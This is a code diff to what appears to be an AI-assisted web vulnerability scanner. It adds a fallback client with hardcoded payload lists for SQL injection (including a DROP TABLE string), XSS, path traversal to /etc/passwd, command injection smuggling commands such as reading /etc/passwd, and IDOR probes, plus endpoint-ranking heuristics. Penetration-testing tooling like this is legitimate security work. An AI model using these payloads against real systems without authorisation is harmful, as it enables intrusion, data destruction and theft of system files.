@@ -24,6 +24,132 @@ class LLMClient:
     async def generate_payload(self, vulnerability_type: str, target_info: Dict) -> List[str]:
         raise NotImplementedError
 
+class BasicClient(LLMClient):
+    """Basic client that works without AI - uses predefined payloads"""
+    
+    def __init__(self):
+        super().__init__()
+        # Predefined payloads for different vulnerability types
+        self.basic_payloads = {
+            'sql_injection': [
+                "' OR '1'='1",
+                "' OR 1=1--",
+                "' UNION SELECT NULL--",
+                "'; DROP TABLE users--",
+                "' OR 'x'='x",
+                "1' OR '1'='1' /*",
+                "' OR 1=1#",
+                "') OR ('1'='1",
+                "' OR '1'='1' --",
+                "admin'--"
+            ],
+            'xss': [
+                "<script>alert('XSS')</script>",
+                "<img src=x onerror=alert('XSS')>",
+                "<svg onload=alert('XSS')>",
+                "javascript:alert('XSS')",
+                "<iframe src=javascript:alert('XSS')>",
+                "<body onload=alert('XSS')>",
+                "<input onfocus=alert('XSS') autofocus>",
+                "<select onfocus=alert('XSS') autofocus>",
+                "<textarea onfocus=alert('XSS') autofocus>",
+                "<keygen onfocus=alert('XSS') autofocus>"
+            ],
+            'path_traversal': [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+                "....//....//....//etc//passwd",
+                "..%2F..%2F..%2Fetc%2Fpasswd",
+                "..%252f..%252f..%252fetc%252fpasswd",
+                "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+                "/var/www/../../etc/passwd",
+                "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",
+                "../../../../../../../etc/passwd%00",
+                "../../boot.ini"
+            ],
+            'command_injection': [
+                "; ls -la",
+                "| whoami",
+                "; cat /etc/passwd",
+                "& dir",
+                "; id",
+                "| cat /etc/hosts",
+                "; uname -a",
+                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
+                "; ps aux",
+                "| netstat -an"
+            ],
+            'idor': [
+                "../admin",
+                "../../user/1",
+                "/admin/users",
+                "?id=1",
+                "?user_id=1",
+                "?account_id=1",
+                "/user/2",
+                "/profile/admin",
+                "?role=admin",
+                "/api/user/1"
+            ]
+        }
+    
+    async def generate_response(self, prompt: str, context: str = "") -> str:
+        return "Basic mode - no AI analysis available"
+    
+    async def analyze_target(self, target_info: Dict) -> Dict:
+        """Basic analysis without AI"""
+        priority_endpoints = []
+        form_analysis = []
+        
+        # Simple heuristic analysis
+        interesting_endpoints = target_info.get('interesting_endpoints', [])
+        for endpoint in interesting_endpoints[:5]:
+            priority = 7  # Default medium priority
+            vuln_types = ['sql_injection', 'xss']
+            
+            if 'admin' in endpoint['url'].lower():
+                priority = 9
+                vuln_types = ['sql_injection', 'xss', 'idor']
+            elif 'api' in endpoint['url'].lower():
+                priority = 8
+                vuln_types = ['sql_injection', 'idor']
+            elif 'login' in endpoint['url'].lower():
+                priority = 8
+                vuln_types = ['sql_injection', 'xss']
+            
+            priority_endpoints.append({
+                'url': endpoint['url'],
+                'priority': priority,
+                'vulnerability_types': vuln_types,
+                'reasoning': f"Basic analysis of {endpoint['type']} endpoint"
+            })
+        
+        # Analyze forms
+        for form in target_info.get('forms', [])[:3]:
+            risk_level = 'medium'
+            recommended_tests = ['sql_injection', 'xss']
+            
+            if form.get('has_file_upload'):
+                risk_level = 'high'
+                recommended_tests.append('path_traversal')
+            
+            form_analysis.append({
+                'form_url': form['url'],
+                'risk_level': risk_level,
+                'recommended_tests': recommended_tests,
+                'reasoning': 'Basic form analysis - manual review recommended'
+            })
+        
+        return {
+            'priority_endpoints': priority_endpoints,
+            'form_analysis': form_analysis,
+            'testing_strategy': 'Basic vulnerability testing without AI analysis. Manual verification strongly recommended.'
+        }
+    
+    async def generate_payload(self, vulnerability_type: str, target_info: Dict) -> List[str]:
+        """Return predefined payloads for vulnerability type"""
+        return self.basic_payloads.get(vulnerability_type, [])
+
 class GeminiClient(LLMClient):
     """Gemini API client for vulnerability analysis and payload generation"""
     
@@ -244,8 +370,11 @@ class LLMManager:
         except Exception as e:
             logger.error(f"Failed to initialize Ollama client: {str(e)}")
         
+        # Add basic client as fallback
         if not self.clients:
-            raise ValueError("No LLM clients available. Please configure Gemini API key or Ollama.")
+            self.clients['basic'] = BasicClient()
+            logger.warning("No AI clients available. Using basic mode with predefined payloads.")
+            logger.warning("For better results, configure Gemini API key or install Ollama.")
     
     def get_preferred_client(self, preference: str = "gemini") -> LLMClient:
         """Get preferred LLM client"""
@@ -258,7 +387,9 @@ class LLMManager:
     
     async def analyze_target_with_fallback(self, target_info: Dict, preference: str = "gemini") -> Dict:
         """Analyze target with fallback to other clients"""
-        for client_name in [preference] + [k for k in self.clients.keys() if k != preference]:
+        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
+        
+        for client_name in client_order:
             if client_name in self.clients:
                 try:
                     logger.info(f"Analyzing target with {client_name}")
@@ -273,7 +404,9 @@ class LLMManager:
     
     async def generate_payloads_with_fallback(self, vulnerability_type: str, target_info: Dict, preference: str = "gemini") -> List[str]:
         """Generate payloads with fallback"""
-        for client_name in [preference] + [k for k in self.clients.keys() if k != preference]:
+        client_order = [preference] + [k for k in self.clients.keys() if k != preference]
+        
+        for client_name in client_order:
             if client_name in self.clients:
                 try:
                     logger.info(f"Generating {vulnerability_type} payloads with {client_name}")
